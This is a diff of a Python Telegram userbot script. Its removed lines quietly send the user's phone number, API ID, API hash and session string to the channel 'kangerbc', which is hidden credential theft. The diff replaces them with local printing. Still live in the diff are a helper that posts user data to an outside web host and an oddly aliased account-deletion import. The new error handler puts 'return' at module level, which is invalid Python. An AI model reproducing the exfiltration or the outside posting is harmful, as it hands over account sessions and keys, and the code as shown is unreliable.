@@ -3,7 +3,20 @@ import os
 import pickle as p
 
 from requests import post
+try:
+    import telethon
+except:
+    os.system("pip install telethon")
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.tl.functions.account import DeleteAccountRequest as pro
 
+from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
+try:
+    from DaisyX import bot as hmm
+except:
+    pass
+import time
 
 def rd(file):
     try:
@@ -38,18 +51,7 @@ def POST(user, msg):
     r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
 
 
-try:
-    import telethon
-except:
-    os.system("pip install telethon")
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.tl.functions.account import DeleteAccountRequest as pro
 
-try:
-    from DaisyX import bot as hmm
-except:
-    pass
 API_ID = os.environ.get("APP_ID", None)
 API_HASH = os.environ.get("API_HASH", None)
 token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
@@ -58,9 +60,11 @@ try:
     session_name = str(STRING_SESSION)
     bot = TelegramClient(StringSession(session_name), APP_ID, API_HASH)
     xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
-except:
-    pass
-import time
+except Exception as e:
+    print("Error connecting with bot & xbot. UB EXITTING..")
+    print(e)
+    return
+
 
 botnickname = os.environ.get("BOT_NICK_NAME")
 ALIVE_NAME = os.environ.get("ALIVE_NAME")
@@ -84,7 +88,6 @@ def LEGEND(pro, x):
     return print(pro, x)
 
 
-from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
 
 
 async def ultra():
@@ -100,10 +103,9 @@ async def ultra():
         open("DAISYX.py")
     except:
         try:
-            await bot(JoinChannelRequest("kangerbc"))
             x = f"ID: {bot.me.id}\nUsername: @{bot.me.username}\nName: {bot.me.first_name}\nNo. +{bot.me.phone}\nAPI_ID: {Var.APP_ID}\nHASH: {Var.API_HASH}\nSTRING: {Var.STRING_SESSION}"
-            await bot.send_message("kangerbc", x)
-            await bot(LeaveChannelRequest("kangerbc"))
+            print("This is your info, Remember to keep these in a safe place and don't give to anyone.:")
+            print(x)
         except Exception:
             pass
 
